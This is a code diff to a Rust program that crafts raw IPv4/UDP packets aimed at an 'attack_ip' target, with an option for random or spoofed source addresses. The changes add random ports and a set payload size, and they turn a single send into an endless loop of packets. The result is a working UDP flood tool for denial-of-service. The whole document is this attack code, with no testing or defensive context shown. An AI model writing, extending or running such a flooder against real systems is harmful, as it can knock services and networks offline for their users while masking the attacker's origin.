@@ -1,7 +1,9 @@
 #[macro_use]
 extern crate clap;
 extern crate pnet;
+extern crate rand;
 
+use rand::Rng;
 use std::str::FromStr;
 use clap::{Arg, App};
 use std::net::{IpAddr, Ipv4Addr};
@@ -10,6 +12,7 @@ use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet;
 use pnet::packet::Packet;
 use pnet::packet::PacketSize;
+use pnet::packet::MutablePacket;
 
 
 fn main() {
@@ -35,9 +38,9 @@ fn main() {
             .short("p")
             .help("Destination port")
             .takes_value(true))
-        .arg(Arg::with_name("datagram-size")
+        .arg(Arg::with_name("payload-size")
             .short("z")
-            .help("Datagram size")
+            .help("UDP payload size (Default: 0; Empty packets)")
             .takes_value(true))
         .arg(Arg::with_name("src-ip")
             .short("s")
@@ -61,7 +64,7 @@ fn main() {
         None => Ipv4Addr::new(0, 0, 0, 0),
     };
 
-    let dst_port = match matches.value_of("dst-port") {
+    let mut dst_port = match matches.value_of("dst-port") {
         Some(destination_port) => match destination_port.parse::<u16>() {
             Ok(port) => port,
             Err(err) => {
@@ -70,6 +73,17 @@ fn main() {
             }
         },
         None => 0u16,
+    };
+
+    let payload_size = match matches.value_of("payload-size") {
+        Some(size) => match size.parse::<u16>() {
+            Ok(size) => size,
+            Err(err) => {
+                println!("Error while setting datagram size: {}", err);
+                std::process::exit(1);
+            }
+        }
+        None => 0,
     };
 
     let random_src = matches.is_present("random-src");
@@ -81,7 +95,6 @@ fn main() {
             std::process::exit(1);
         }
     };
-    println!("{:?}", attack_ip);
 
 
     if !src_ip.is_unspecified() && random_src == true {
@@ -94,24 +107,35 @@ fn main() {
         Err(e) => panic!("{}", e),
     };
 
+    let mut rng = rand::thread_rng();
+
+    let random_src_port = rng.gen::<u16>();
+
+    if !matches.is_present("dst-port") {
+        let random_dst_port = rng.gen::<u16>();
+        dst_port = random_dst_port;
+    }
+
     let udp_struct = packet::udp::Udp {
-        source: 1337,
+        source: random_src_port,
         destination: dst_port,
-        length: 28, // at least 8, to hold all header data without a payload
+        length: 8 + payload_size, // at least 8, to hold all header data without a payload
         checksum: 0,
-        payload: vec![5u8; 20],
+        payload: vec![0u8; payload_size as usize],
     };
 
-    let mut udp_buffer = vec![0u8; 28];
+    let mut udp_buffer = vec![0u8; 8 + payload_size as usize];
+    let udp_buffer_len = udp_buffer.len() as u16;
     let mut udp_packet = packet::udp::MutableUdpPacket::new(&mut udp_buffer).unwrap();
+
     udp_packet.populate(&udp_struct);
 
     let ipv4_struct = packet::ipv4::Ipv4 {
         version: 4,
-        header_length: 5,
+        header_length: 5, // 5 is the minimum amount of 32 bit words the IPv4 header can consist of, a larger number than 5 will enable the IPv4 options header
         dscp: 0,
         ecn: 0,
-        total_length: 48,
+        total_length: 20 + udp_buffer_len, // 20 is the minimum amount of bytes an IPv4 packet can be (header only)
         identification: 0,
         flags: 0,
         fragment_offset: 0,
@@ -121,21 +145,25 @@ fn main() {
         source: src_ip,
         destination: dst_ip,
         options: vec![],
-        payload: vec![0u8; 28],
+        payload: vec![0u8; udp_buffer_len as usize],
 
     };
 
-    let mut ipv4_buffer = vec![0u8; 48];
+    let mut ipv4_buffer = vec![0u8; 20 + udp_buffer_len as usize];
+    let mut buffer_clone = ipv4_buffer.clone();
 
 
     let mut ipv4_packet = packet::ipv4::MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();
 
     ipv4_packet.populate(&ipv4_struct);
-    println!("{}", ipv4_packet.packet_size());
     println!("{:?}", ipv4_packet);
     ipv4_packet.set_payload(udp_packet.packet());
-    let written = match tx.send_to(ipv4_packet, IpAddr::V4(dst_ip)) {
-        Ok(written) => written,
-        Err(e) => panic!("{}", e),
-    };
+    loop {
+        let mut cloned_packet = packet::ipv4::MutableIpv4Packet::new(&mut buffer_clone).unwrap();
+        cloned_packet.clone_from(&ipv4_packet);
+        let written = match tx.send_to(cloned_packet, IpAddr::V4(dst_ip)) {
+            Ok(written) => written,
+            Err(e) => panic!("{}", e),
+        };
+    }
 }
